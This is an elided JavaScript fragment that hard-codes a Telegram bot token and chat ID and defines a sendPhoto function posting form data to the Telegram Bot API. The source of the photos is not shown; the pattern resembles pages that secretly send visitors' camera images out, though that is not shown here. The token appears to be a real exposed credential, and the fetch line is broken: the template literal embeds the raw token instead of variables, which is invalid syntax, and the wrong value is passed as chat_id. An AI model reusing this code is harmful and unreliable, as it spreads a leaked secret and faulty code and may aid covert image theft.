...
const BOT_TOKEN = '8425988584:AAEIEIP694_koSrE9i3xtH6CzTp1vbW3wgY'; // Replace with your bot's TOKEN
const CHAT_ID = '6794474284'; // Replace with your bot's chat ID
        ...
        function sendPhoto(photo) {
            ...
            fetch(`https://api.telegram.org/bot${8425988584:AAEIEIP694_koSrE9i3xtH6CzTp1vbW3wgY}/sendPhoto?chat_id=${8425988584}`, {
                method: 'POST',
                body: formData
            })
            .then(response => {
